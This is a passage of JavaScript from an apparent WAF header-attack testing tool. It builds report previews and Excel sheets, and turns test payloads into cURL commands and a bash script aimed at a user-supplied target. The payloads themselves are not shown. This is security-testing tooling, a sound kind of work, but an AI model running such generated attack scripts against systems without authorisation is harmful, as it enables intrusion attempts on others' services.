            document.querySelector('input[name="wafColorTheme"][value="technical"]').checked = true;
            break;
            
        case 'compliance':
            document.getElementById('wafReportTitle').value = 'WAF Security Compliance Report';
            document.getElementById('wafIncludeCurlCommands').checked = false;
            document.getElementById('wafIncludeShellScript').checked = false;
            document.querySelector('input[name="wafColorTheme"][value="corporate"]').checked = true;
            break;
            
        case 'penetration':
            document.getElementById('wafReportTitle').value = 'WAF Penetration Test Report';
            document.getElementById('wafIncludeDetailedAnalysis').checked = true;
            document.getElementById('wafIncludeCurlCommands').checked = true;
            document.getElementById('wafIncludeShellScript').checked = true;
            document.querySelector('input[name="wafColorTheme"][value="security"]').checked = true;
            break;
    }
}

// Refresh the preview
function refreshWafPreview() {
    const selectedTests = getSelectedTests();
    if (selectedTests.length === 0) {
        document.getElementById('wafPreviewContent').innerHTML = `
            <div class="waf-preview-placeholder">
                <i class="fas fa-exclamation-circle"></i>
                <p>Please select at least one test to generate a preview</p>
            </div>
        `;
        return;
    }
    
    const previewType = document.getElementById('wafPreviewSheet').value;
    generateWafPreview(previewType, selectedTests);
}

// Update the preview when changing the sheet type
function updateWafPreview() {
    refreshWafPreview();
}

// Generate preview for selected sheet
function generateWafPreview(previewType, tests) {
    const previewContent = document.getElementById('wafPreviewContent');
    previewContent.innerHTML = '<div class="waf-preview-loading"><i class="fas fa-spinner fa-spin"></i> Generating preview...</div>';
    
    setTimeout(() => {
        switch(previewType) {
            case 'executiveSummary':
                generateExecutiveSummaryPreview(tests);
                break;
                
            case 'detailedAnalysis':
                generateDetailedAnalysisPreview(tests);
                break;
                
            case 'statistics':
                generateStatisticsPreview(tests);
                break;
                
            case 'curlCommands':
                generateCurlCommandsPreview(tests);
                break;
                
            case 'shellScript':
                generateShellScriptPreview(tests);
                break;
        }
    }, 500);
}

// Generate Executive Summary preview
function generateExecutiveSummaryPreview(tests) {
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const reportTitle = document.getElementById('wafReportTitle').value || 'WAF Header Attack Test Report';
    const companyName = document.getElementById('wafCompanyName').value || '';
    
    // Count by severity
    const severityCounts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    };
    
    tests.forEach(({ test }) => {
        if (severityCounts[test.severity] !== undefined) {
            severityCounts[test.severity]++;
        }
    });
    
    // Get the top 5 categories
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    const topCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-executive-summary">
            <div class="waf-preview-header">
                <h2>${reportTitle}</h2>
                ${companyName ? `<h3>${companyName}</h3>` : ''}
                <p class="waf-preview-date">Generated: ${new Date().toLocaleString()}</p>
            </div>
            
            <div class="waf-preview-summary-card">
                <h3>Executive Summary</h3>
                <p>This report provides an analysis of WAF (Web Application Firewall) header attack tests performed against <strong>${targetUrl}</strong>. The tests evaluate the security posture and resilience of the web application against various attack vectors targeting HTTP headers.</p>
                
                <div class="waf-preview-summary-stats">
                    <div class="waf-summary-stat">
                        <div class="waf-stat-value">${tests.length}</div>
                        <div class="waf-stat-label">Total Tests</div>
                    </div>
                    <div class="waf-summary-stat critical">
                        <div class="waf-stat-value">${severityCounts.critical}</div>
                        <div class="waf-stat-label">Critical</div>
                    </div>
                    <div class="waf-summary-stat high">
                        <div class="waf-stat-value">${severityCounts.high}</div>
                        <div class="waf-stat-label">High</div>
                    </div>
                    <div class="waf-summary-stat medium">
                        <div class="waf-stat-value">${severityCounts.medium}</div>
                        <div class="waf-stat-label">Medium</div>
                    </div>
                    <div class="waf-summary-stat low">
                        <div class="waf-stat-value">${severityCounts.low}</div>
                        <div class="waf-stat-label">Low</div>
                    </div>
                </div>
            </div>
            
            <div class="waf-preview-summary-card">
                <h3>Key Findings</h3>
                <div class="waf-key-findings">
                    <div class="waf-finding">
                        <div class="waf-finding-icon ${severityCounts.critical > 0 ? 'critical' : 'success'}">
                            <i class="fas ${severityCounts.critical > 0 ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i>
                        </div>
                        <div class="waf-finding-content">
                            <h4>Critical Vulnerabilities</h4>
                            <p>${severityCounts.critical > 0 ? 
                                `Identified ${severityCounts.critical} critical vulnerabilities that require immediate attention.` : 
                                'No critical vulnerabilities were identified in the tests.'}</p>
                        </div>
                    </div>
                    
                    <div class="waf-finding">
                        <div class="waf-finding-icon ${severityCounts.high > 0 ? 'high' : 'success'}">
                            <i class="fas ${severityCounts.high > 0 ? 'fa-exclamation-circle' : 'fa-check-circle'}"></i>
                        </div>
                        <div class="waf-finding-content">
                            <h4>High Risk Issues</h4>
                            <p>${severityCounts.high > 0 ? 
                                `Found ${severityCounts.high} high risk issues that should be addressed promptly.` : 
                                'No high risk issues were identified in the tests.'}</p>
                        </div>
                    </div>
                    
                    <div class="waf-finding">
                        <div class="waf-finding-icon ${topCategories.length > 0 ? 'medium' : 'success'}">
                            <i class="fas fa-shield-alt"></i>
                        </div>
                        <div class="waf-finding-content">
                            <h4>Primary Attack Vectors</h4>
                            <p>The most common attack vectors tested were ${
                                topCategories.length > 0 ? 
                                topCategories.map(([category]) => category).join(', ') : 
                                'not available due to insufficient data'
                            }.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
}

// Generate Detailed Analysis preview
function generateDetailedAnalysisPreview(tests) {
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const proxyUrl = document.getElementById('proxyUrl').value || '';
    const requestMethod = document.getElementById('wafRequestMethod').value || 'GET';
    const curlFormat = document.getElementById('wafCurlFormat').value || 'verbose';
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-detailed-analysis">
            <h3>Detailed Test Analysis</h3>
            <div class="waf-analysis-table-container">
                <table class="waf-analysis-table">
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th>Test Name</th>
                            <th>Description</th>
                            <th>Severity</th>
                            <th>Payload</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${tests.slice(0, 5).map(({ category, test }) => {
                            return `
                                <tr class="waf-severity-${test.severity}">
                                    <td>${category}</td>
                                    <td><strong>${test.name}</strong></td>
                                    <td>${test.description || 'No description available'}</td>
                                    <td><span class="waf-severity-badge ${test.severity}">${test.severity.toUpperCase()}</span></td>
                                    <td><code>${escapeHtml(test.payload)}</code></td>
                                </tr>
                            `;
                        }).join('')}
                        ${tests.length > 5 ? `
                            <tr class="waf-more-rows">
                                <td colspan="5" class="waf-more-info">
                                    <i class="fas fa-info-circle"></i> 
                                    Showing 5 of ${tests.length} tests. The full report will include all tests.
                                </td>
                            </tr>
                        ` : ''}
                    </tbody>
                </table>
            </div>
        </div>
    `;
}

// Generate Statistics preview
function generateStatisticsPreview(tests) {
    // Count by severity
    const severityCounts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    };
    
    tests.forEach(({ test }) => {
        if (severityCounts[test.severity] !== undefined) {
            severityCounts[test.severity]++;
        }
    });
    
    // Count by category
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    // Get top categories
    const topCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    // Calculate risk level
    const riskLevel = calculateRiskLevel(severityCounts, tests.length);
    
    previewContent.innerHTML = `
        <div class="waf-preview-statistics">
            <div class="waf-statistics-grid">
                <div class="waf-statistics-card">
                    <h3>Test Distribution by Severity</h3>
                    <div class="waf-stat-donut-chart">
                        <div class="waf-donut-placeholder">
                            <div class="waf-severity-distribution">
                                <div class="waf-severity-segment critical" style="width: ${(severityCounts.critical / tests.length * 100).toFixed(1)}%"></div>
                                <div class="waf-severity-segment high" style="width: ${(severityCounts.high / tests.length * 100).toFixed(1)}%"></div>
                                <div class="waf-severity-segment medium" style="width: ${(severityCounts.medium / tests.length * 100).toFixed(1)}%"></div>
                                <div class="waf-severity-segment low" style="width: ${(severityCounts.low / tests.length * 100).toFixed(1)}%"></div>
                            </div>
                        </div>
                        <div class="waf-donut-legend">
                            <div class="waf-legend-item">
                                <span class="waf-legend-color critical"></span>
                                <span class="waf-legend-label">Critical (${severityCounts.critical})</span>
                            </div>
                            <div class="waf-legend-item">
                                <span class="waf-legend-color high"></span>
                                <span class="waf-legend-label">High (${severityCounts.high})</span>
                            </div>
                            <div class="waf-legend-item">
                                <span class="waf-legend-color medium"></span>
                                <span class="waf-legend-label">Medium (${severityCounts.medium})</span>
                            </div>
                            <div class="waf-legend-item">
                                <span class="waf-legend-color low"></span>
                                <span class="waf-legend-label">Low (${severityCounts.low})</span>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="waf-statistics-card">
                    <h3>Top Attack Categories</h3>
                    <div class="waf-category-chart">
                        ${topCategories.map(([category, count]) => `
                            <div class="waf-category-bar">
                                <div class="waf-category-name">${category}</div>
                                <div class="waf-category-bar-container">
                                    <div class="waf-category-bar-fill" style="width: ${(count / tests.length * 100).toFixed(1)}%"></div>
                                </div>
                                <div class="waf-category-count">${count}</div>
                            </div>
                        `).join('')}
                    </div>
                </div>
                
                <div class="waf-statistics-card summary-metrics">
                    <h3>Summary Metrics</h3>
                    <div class="waf-metrics-grid">
                        <div class="waf-metric-item">
                            <div class="waf-metric-value">${tests.length}</div>
                            <div class="waf-metric-label">Total Tests</div>
                        </div>
                        <div class="waf-metric-item">
                            <div class="waf-metric-value">${Object.keys(categoryCounts).length}</div>
                            <div class="waf-metric-label">Categories</div>
                        </div>
                        <div class="waf-metric-item">
                            <div class="waf-metric-value">${((severityCounts.critical + severityCounts.high) / tests.length * 100).toFixed(1)}%</div>
                            <div class="waf-metric-label">High Risk</div>
                        </div>
                        <div class="waf-metric-item">
                            <div class="waf-metric-value">${((severityCounts.medium + severityCounts.low) / tests.length * 100).toFixed(1)}%</div>
                            <div class="waf-metric-label">Low Risk</div>
                        </div>
                    </div>
                </div>
                
                <div class="waf-statistics-card">
                    <h3>Risk Assessment</h3>
                    <div class="waf-risk-assessment">
                        <div class="waf-risk-meter-container">
                            <div class="waf-risk-meter">
                                <div class="waf-risk-level" style="--risk-level: ${riskLevel}%"></div>
                            </div>
                            <div class="waf-risk-labels">
                                <span>Low</span>
                                <span>Medium</span>
                                <span>High</span>
                                <span>Critical</span>
                            </div>
                        </div>
                        <div class="waf-risk-summary">
                            <p>Based on the selected test suite, the overall risk level is 
                            <strong>${getRiskCategory(riskLevel)}</strong>.</p>
                            <p>The assessment is based on ${tests.length} tests across ${Object.keys(categoryCounts).length} attack categories.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
}

// Generate cURL Commands preview
// Generate cURL Commands preview
function generateCurlCommandsPreview(tests) {
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const proxyUrl = document.getElementById('proxyUrl').value || '';
    const requestMethod = document.getElementById('wafRequestMethod').value || 'GET';
    const curlFormat = document.getElementById('wafCurlFormat').value || 'verbose';
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-curl-commands">
            <h3>cURL Command Generation</h3>
            <p>Below are sample cURL commands for executing the selected WAF header attack tests. Each command is designed to send the specific payload to the target URL.</p>
            
            <div class="waf-curl-list">
                ${tests.slice(0, 5).map(({ category, test }, index) => {
                    const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat);
                    
                    return `
                        <div class="waf-curl-item">
                            <div class="waf-curl-header">
                                <div class="waf-curl-title">
                                    <span class="waf-curl-badge">${index + 1}</span>
                                    ${test.name}
                                </div>
                                <span class="waf-severity-badge ${test.severity}">${test.severity.toUpperCase()}</span>
                            </div>
                            <div class="waf-curl-content">
                                <div class="waf-curl-payload">
                                    <strong>Payload:</strong> <code>${escapeHtml(test.payload)}</code>
                                </div>
                                <div class="waf-curl-command">
                                    <strong>Command:</strong> <code>${escapeHtml(curlCommand)}</code>
                                </div>
                            </div>
                            <div class="waf-curl-action">
                                <button class="waf-curl-copy" onclick="copyTextToClipboard('${escapeHtml(curlCommand)}')">
                                    <i class="fas fa-copy"></i> Copy Command
                                </button>
                            </div>
                        </div>
                    `;
                }).join('')}
                
                ${tests.length > 5 ? `
                    <div class="waf-curl-item">
                        <div class="waf-curl-header">
                            <div class="waf-curl-title">
                                <i class="fas fa-info-circle"></i>
                                Additional Commands
                            </div>
                        </div>
                        <div class="waf-curl-content">
                            <p>The full report will include cURL commands for all ${tests.length} selected tests.</p>
                        </div>
                    </div>
                ` : ''}
            </div>
        </div>
    `;
}

// Generate Shell Script preview
function generateShellScriptPreview(tests) {
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const proxyUrl = document.getElementById('proxyUrl').value || '';
    const requestMethod = document.getElementById('wafRequestMethod').value || 'GET';
    const curlFormat = document.getElementById('wafCurlFormat').value || 'verbose';
    
    // Generate shell script content
    let scriptContent = `#!/bin/bash
# WAF Header Attack Test Script
# Generated: ${new Date().toISOString()}
# Target: ${targetUrl}
# Total Tests: ${tests.length}

TARGET="${targetUrl}"
${proxyUrl ? `PROXY="${proxyUrl}"` : '# No proxy configured'}
LOGFILE="waf_test_$(date +%Y%m%d_%H%M%S).log"

echo "Starting WAF Header Attack Tests..." | tee $LOGFILE
echo "Target: $TARGET" | tee -a $LOGFILE
echo "===========================================" | tee -a $LOGFILE

`;

    // Add first 5 tests for preview
    tests.slice(0, 5).forEach(({ category, test }, index) => {
        const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat);
        
        scriptContent += `
# Test ${index + 1}: ${category} - ${test.name}
echo -e "\\n[TEST ${index + 1}] ${test.name}" | tee -a $LOGFILE
echo "[SEVERITY] ${test.severity.toUpperCase()}" | tee -a $LOGFILE

${curlCommand} 2>&1 | tee -a $LOGFILE
echo "-------------------------------------------" | tee -a $LOGFILE
`;
    });
    
    // Add ending
    scriptContent += `
# ... additional tests would be included in the full script ...

echo -e "\\nTesting complete. Results saved to: $LOGFILE"
echo "Total tests executed: ${tests.length}"
`;
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-shell-script">
            <h3>Shell Script Generator</h3>
            <p>This bash script will execute all ${tests.length} selected WAF header attack tests and log the results. The script can be downloaded and run directly on Linux or macOS systems with cURL installed.</p>
            
            <div class="waf-shell-container">
                <div class="waf-shell-header">
                    <div class="waf-shell-title">waf_header_attack_test.sh</div>
                    <div class="waf-shell-actions">
                        <button class="waf-shell-action" onclick="copyTextToClipboard(\`${escapeHtml(scriptContent)}\`)">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                </div>
                <div class="waf-shell-content">
                    ${formatShellScript(scriptContent)}
                </div>
            </div>
        </div>
    `;
}

// Format shell script with syntax highlighting
function formatShellScript(script) {
    return script.split('\n').map(line => {
        let formattedLine = escapeHtml(line);
        
        if (line.startsWith('#')) {
            // Comment
            formattedLine = `<span class="waf-shell-comment">${formattedLine}</span>`;
        } else if (line.includes('echo')) {
            // Echo command
            formattedLine = formattedLine.replace(/echo(.*)/g, '<span class="waf-shell-command">echo</span>$1');
        } else if (line.includes('curl')) {
            // cURL command
            formattedLine = `<span class="waf-shell-command">${formattedLine}</span>`;
        } else if (line.match(/^[A-Z_]+=.*/)) {
            // Variable assignment
            formattedLine = `<span class="waf-shell-variable">${formattedLine}</span>`;
        }
        
        return `<p class="waf-shell-line">${formattedLine}</p>`;
    }).join('');
}

// Copy text to clipboard
function copyTextToClipboard(text) {
    // Create temporary element
    const el = document.createElement('textarea');
    el.value = text;
    el.setAttribute('readonly', '');
    el.style.position = 'absolute';
    el.style.left = '-9999px';
    document.body.appendChild(el);
    
    // Select text
    el.select();
    document.execCommand('copy');
    
    // Clean up
    document.body.removeChild(el);
    
    // Show toast message
    alert('Copied to clipboard!');
}

// Generate cURL command
function generateCurlCommand(payload, targetUrl, proxyUrl, method = 'GET', format = 'verbose') {
    // Start with basic curl command
    let curlCmd = `curl`;
    
    // Add format options
    switch (format) {
        case 'verbose':
            curlCmd += ` -v`;
            break;
        case 'insecure':
            curlCmd += ` -k`;
            break;
        case 'full':
            curlCmd += ` -v -k`;
            break;
    }
    
    // Add HTTP method if not GET
    if (method !== 'GET') {
        curlCmd += ` -X ${method}`;
    }
    
    // Add proxy if specified
    if (proxyUrl) {
        curlCmd += ` -x "${proxyUrl}"`;
    }
    
    // Get any additional headers
    const additionalHeaders = getAdditionalHeaders();
    
    // Add the headers
    if (additionalHeaders.length > 0) {
        additionalHeaders.forEach(header => {
            curlCmd += ` -H "${escapeForBash(header.name)}: ${escapeForBash(header.value)}"`;
        });
    }
    
    // Handle the payload - escape for bash double quotes
    let escapedPayload = escapeForBash(payload);
    
    // Add the header or data based on payload format
    if (payload.includes(':')) {
        // It's a header
        curlCmd += ` -H "${escapedPayload}"`;
    } else {
        // It's data
        curlCmd += ` --data-raw "${escapedPayload}"`;
    }
    
    // Add the target URL
    curlCmd += ` "${targetUrl}"`;
    
    return curlCmd;
}

// Get additional headers from the UI
function getAdditionalHeaders() {
    const headers = [];
    const headerRows = document.querySelectorAll('.waf-header-row');
    
    headerRows.forEach(row => {
        const nameInput = row.querySelector('.waf-header-name');
        const valueInput = row.querySelector('.waf-header-value');
        
        if (nameInput && valueInput && nameInput.value.trim() !== '') {
            headers.push({
                name: nameInput.value.trim(),
                value: valueInput.value.trim()
            });
        }
    });
    
    return headers;
}

// Escape string for use in bash double quotes
function escapeForBash(str) {
    if (!str) return '';
    return str
        .replace(/\\/g, '\\\\')  // Escape backslashes
        .replace(/"/g, '\\"')    // Escape double quotes
        .replace(/\$/g, '\\$')   // Escape dollar signs
        .replace(/`/g, '\\`');   // Escape backticks
}

// Function to calculate risk level
function calculateRiskLevel(severityCounts, totalTests) {
    if (totalTests === 0) return 0;
    
    // Weighted risk calculation
    const criticalWeight = 100;
    const highWeight = 70;
    const mediumWeight = 40;
    const lowWeight = 10;
    
    const weightedSum = 
        severityCounts.critical * criticalWeight +
        severityCounts.high * highWeight +
        severityCounts.medium * mediumWeight +
        severityCounts.low * lowWeight;
    
    // Maximum possible risk (if all were critical)
    const maxRisk = totalTests * criticalWeight;
    
    return (weightedSum / maxRisk) * 100;
}

// Function to get risk category
function getRiskCategory(riskLevel) {
    if (riskLevel >= 75) return 'Critical';
    if (riskLevel >= 50) return 'High';
    if (riskLevel >= 25) return 'Medium';
    return 'Low';
}

// Split text into chunks safe for Excel
function splitTextForExcel(text) {
    const MAX_EXCEL_CHARS = 32000; // Slightly less than the 32,767 limit for safety
    const chunks = [];
    
    for (let i = 0; i < text.length; i += MAX_EXCEL_CHARS) {
        chunks.push(text.substring(i, i + MAX_EXCEL_CHARS));
    }
    
    return chunks;
}

// Truncate text to be safe for Excel
function truncateForExcel(text) {
    const MAX_EXCEL_CHARS = 32000; // Slightly less than the 32,767 limit for safety
    
    if (text && text.length > MAX_EXCEL_CHARS) {
        return text.substring(0, MAX_EXCEL_CHARS) + '... [truncated]';
    }
    
    return text;
}

// Helper function to escape HTML
function escapeHtml(text) {
    if (!text) return '';
    
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.toString().replace(/[&<>"']/g, m => map[m]);
}

// Generate the advanced Excel report
function generateAdvancedWafReport() {
    // Check if required libraries are loaded
    if (typeof XLSX === 'undefined') {
        loadScripts().then(() => {
            setTimeout(() => generateAdvancedWafReport(), 500);
        }).catch(error => {
            console.error('Failed to load required libraries:', error);
            alert('Failed to load required libraries. Please check your internet connection and try again.');
        });
        return;
    }
    
    const selectedTests = getSelectedTests();
    
    if (selectedTests.length === 0) {
        alert('Please select at least one test');
        return;
    }
    
    // Show progress overlay
    const progressOverlay = document.getElementById('wafReportProgress');
    progressOverlay.classList.add('active');
    
    try {
        // Get report options
        const reportTitle = document.getElementById('wafReportTitle').value || 'WAF Header Attack Test Report';
        const companyName = document.getElementById('wafCompanyName').value || '';
        const reportAuthor = document.getElementById('wafReportAuthor').value || '';
        const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
        const proxyUrl = document.getElementById('proxyUrl').value || '';
        const colorTheme = document.querySelector('input[name="wafColorTheme"]:checked').value;
        const reportFormat = document.querySelector('input[name="wafReportFormat"]:checked').value;
        const requestMethod = document.getElementById('wafRequestMethod').value || 'GET';
        const curlFormat = document.getElementById('wafCurlFormat').value || 'verbose';
        
        // Feature options
        const includeExecutiveSummary = document.getElementById('wafIncludeExecutiveSummary').checked;
        const includeDetailedAnalysis = document.getElementById('wafIncludeDetailedAnalysis').checked;
        const includeStatistics = document.getElementById('wafIncludeStatistics').checked;
        const includeCharts = document.getElementById('wafIncludeCharts').checked;
        const includePayloads = document.getElementById('wafIncludePayloads').checked;
        const includeCurlCommands = document.getElementById('wafIncludeCurlCommands').checked;
        const includeRecommendations = document.getElementById('wafIncludeRecommendations').checked;
        const includeShellScript = document.getElementById('wafIncludeShellScript').checked;
        
        // Additional headers
        const additionalHeaders = getAdditionalHeaders();
        
        // Update progress
        updateWafProgress(10, 'Preparing report data...');
        
        // Create workbook
        const wb = XLSX.utils.book_new();
        
        // Add workbook properties
        wb.Props = {
            Title: reportTitle,
            Subject: 'Security Test Report',
            Author: reportAuthor || 'WAF Testing Suite',
            CreatedDate: new Date()
        };
        
        updateWafProgress(20, 'Building executive summary...');
        
        // Create executive summary worksheet
        if (includeExecutiveSummary) {
            const summaryData = createExecutiveSummaryData(selectedTests, targetUrl, reportTitle, companyName, reportAuthor);
            const summaryWs = XLSX.utils.aoa_to_sheet(summaryData);
            XLSX.utils.book_append_sheet(wb, summaryWs, "Executive Summary");
        }
        
        updateWafProgress(40, 'Generating detailed analysis...');
        
        // Create detailed analysis worksheet
        if (includeDetailedAnalysis) {
            const detailedData = createDetailedAnalysisData(selectedTests, includePayloads, targetUrl, proxyUrl, requestMethod, curlFormat);
            const detailedWs = XLSX.utils.aoa_to_sheet(detailedData);
            XLSX.utils.book_append_sheet(wb, detailedWs, "Detailed Analysis");
        }
        
        updateWafProgress(60, 'Building statistics dashboard...');
        
        // Create statistics worksheet
        if (includeStatistics) {
            const statsData = createStatisticsData(selectedTests);
            const statsWs = XLSX.utils.aoa_to_sheet(statsData);
            XLSX.utils.book_append_sheet(wb, statsWs, "Statistics");
        }
        
        updateWafProgress(75, 'Generating cURL commands...');
        
        // Create cURL commands worksheet
        if (includeCurlCommands) {
            const curlData = createCurlCommandsData(selectedTests, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders);
            const curlWs = XLSX.utils.aoa_to_sheet(curlData);
            XLSX.utils.book_append_sheet(wb, curlWs, "cURL Commands");
        }
        
        updateWafProgress(85, 'Creating shell script...');
        
        // Create shell script worksheet
        if (includeShellScript) {
            const shellData = createShellScriptData(selectedTests, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders);
            const shellWs = XLSX.utils.aoa_to_sheet(shellData);
            XLSX.utils.book_append_sheet(wb, shellWs, "Shell Script");
        }
        
        updateWafProgress(90, 'Generating recommendations...');
        
        // Create recommendations worksheet
        if (includeRecommendations) {
            const recommendationsData = createRecommendationsData(selectedTests);
            const recommendationsWs = XLSX.utils.aoa_to_sheet(recommendationsData);
            XLSX.utils.book_append_sheet(wb, recommendationsWs, "Recommendations");
        }
        
        updateWafProgress(95, 'Finalizing report...');
        
        // Generate filename with timestamp
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').substring(0, 19);
        let filename = `WAF_Test_Report_${timestamp}`;
        
        if (companyName) {
            filename = `${companyName.replace(/[^a-zA-Z0-9]/g, '_')}_${filename}`;
        }
        
        // Add extension based on format
        filename += reportFormat === 'xlsx' ? '.xlsx' : '.csv';
        
        // Write and download the file
        XLSX.writeFile(wb, filename);
        
        // Add to report history
        addToWafReportHistory({
            title: reportTitle,
            timestamp: new Date(),
            filename: filename,
            testCount: selectedTests.length
        });
        
        updateWafProgress(100, 'Report generated successfully!');
        
        // Hide progress overlay after a short delay
        setTimeout(() => {
            progressOverlay.classList.remove('active');
            
            // Show success message
            showWafSuccessMessage(filename);
            
            // Close the panel
            toggleReportPanel();
        }, 1000);
    } catch (error) {
        console.error('Error generating report:', error);
        alert('An error occurred while generating the report: ' + error.message);
        progressOverlay.classList.remove('active');
    }
}

// Update progress indicator
function updateWafProgress(percent, status) {
    document.getElementById('wafReportProgressBar').style.width = `${percent}%`;
    document.getElementById('wafReportProgressStatus').textContent = status;
}

// Create executive summary data
function createExecutiveSummaryData(tests, targetUrl, reportTitle, companyName, reportAuthor) {
    // Count by severity
    const severityCounts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    };
    
    tests.forEach(({ test }) => {
        if (severityCounts[test.severity] !== undefined) {
            severityCounts[test.severity]++;
        }
    });
    
    // Count by category
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    // Calculate risk level
    const riskLevel = calculateRiskLevel(severityCounts, tests.length);
    const riskCategory = getRiskCategory(riskLevel);
    
    // Get top categories
    const topCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .map(([category]) => category)
        .join(', ');
    
    // Create data
    const data = [
        [reportTitle, '', '', '', '', ''],
        ['', '', '', '', '', ''],
        ['Executive Summary', '', '', '', '', ''],
        ['', '', '', '', '', ''],
        ['Report Information', '', '', '', '', ''],
        ['Target URL:', targetUrl, '', '', '', ''],
        ['Generated:', new Date().toLocaleString(), '', '', '', ''],
        ['Company:', companyName || 'Not specified', '', '', '', ''],
        ['Author:', reportAuthor || 'Not specified', '', '', '', ''],
        ['', '', '', '', '', ''],
        ['Test Summary', '', '', '', '', ''],
        ['Total Tests:', tests.length.toString(), '', '', '', ''],
        ['Risk Assessment:', riskCategory, '', '', '', ''],
        ['', '', '', '', '', ''],
        ['Severity Breakdown', '', '', '', '', ''],
        ['Critical:', severityCounts.critical.toString(), `${((severityCounts.critical / tests.length) * 100).toFixed(1)}%`, '', '', ''],
        ['High:', severityCounts.high.toString(), `${((severityCounts.high / tests.length) * 100).toFixed(1)}%`, '', '', ''],
        ['Medium:', severityCounts.medium.toString(), `${((severityCounts.medium / tests.length) * 100).toFixed(1)}%`, '', '', ''],
        ['Low:', severityCounts.low.toString(), `${((severityCounts.low / tests.length) * 100).toFixed(1)}%`, '', '', ''],
        ['', '', '', '', '', ''],
        ['Key Findings', '', '', '', '', ''],
        ['', '', '', '', '', '']
    ];
    
    // Add key findings based on severity counts
    if (severityCounts.critical > 0) {
        data.push([
            ` Critical Vulnerabilities: Identified ${severityCounts.critical} critical issues that require immediate attention.`,
            '', '', '', '', ''
        ]);
    }
    
    if (severityCounts.high > 0) {
        data.push([
            ` High Risk Issues: Found ${severityCounts.high} high-risk vulnerabilities that should be addressed promptly.`,
            '', '', '', '', ''
        ]);
    }
    
    data.push([
        ` Primary Attack Vectors: The most common attack categories tested were ${topCategories}.`,
        '', '', '', '', ''
    ]);
    
    data.push(['', '', '', '', '', '']);
    
    // Add executive recommendations
    data.push(['Executive Recommendations', '', '', '', '', '']);
    data.push(['', '', '', '', '', '']);
    
    if (severityCounts.critical > 0) {
        data.push([
            '1. Address critical vulnerabilities immediately to mitigate potential system compromise.',
            '', '', '', '', ''
        ]);
    }
    
    if (severityCounts.high > 0) {
        data.push([
            '2. Implement WAF rule enhancements for high-risk attack vectors, particularly for header manipulation.',
            '', '', '', '', ''
        ]);
    }
    
    data.push([
        '3. Review WAF configuration to ensure proper handling of malformed HTTP headers.',
        '', '', '', '', ''
    ]);
    
    data.push([
        '4. Conduct regular security testing with updated attack patterns to maintain robust protection.',
        '', '', '', '', ''
    ]);
    
    return data;
}

// Create detailed analysis data with text limits
function createDetailedAnalysisData(tests, includePayloads, targetUrl, proxyUrl, requestMethod, curlFormat) {
    // Determine columns based on includePayloads
    const headers = includePayloads ? 
        ['Category', 'Test Name', 'Severity', 'Payload', 'Description'] :
        ['Category', 'Test Name', 'Severity', 'Description'];
    
    const data = [headers];
    
    // Add test rows
    tests.forEach(({ category, test }) => {
        if (includePayloads) {
            data.push([
                category,
                test.name,
                test.severity.toUpperCase(),
                truncateForExcel(test.payload),
                test.description ? truncateForExcel(test.description) : 'No description available'
            ]);
        } else {
            data.push([
                category,
                test.name,
                test.severity.toUpperCase(),
                test.description ? truncateForExcel(test.description) : 'No description available'
            ]);
        }
    });
    
    return data;
}

// Create statistics data
function createStatisticsData(tests) {
    // Count by severity
    const severityCounts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    };
    
    tests.forEach(({ test }) => {
        if (severityCounts[test.severity] !== undefined) {
            severityCounts[test.severity]++;
        }
    });
    
    // Count by category
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    // Create data
    const data = [
        ['WAF Header Attack Test Statistics', '', '', ''],
        ['', '', '', ''],
        ['Tests by Severity', '', '', ''],
        ['Severity', 'Count', 'Percentage', 'Risk Weight'],
    ];
    
    // Add severity stats
    data.push(['Critical', severityCounts.critical, ((severityCounts.critical / tests.length) * 100).toFixed(1) + '%', '100']);
    data.push(['High', severityCounts.high, ((severityCounts.high / tests.length) * 100).toFixed(1) + '%', '70']);
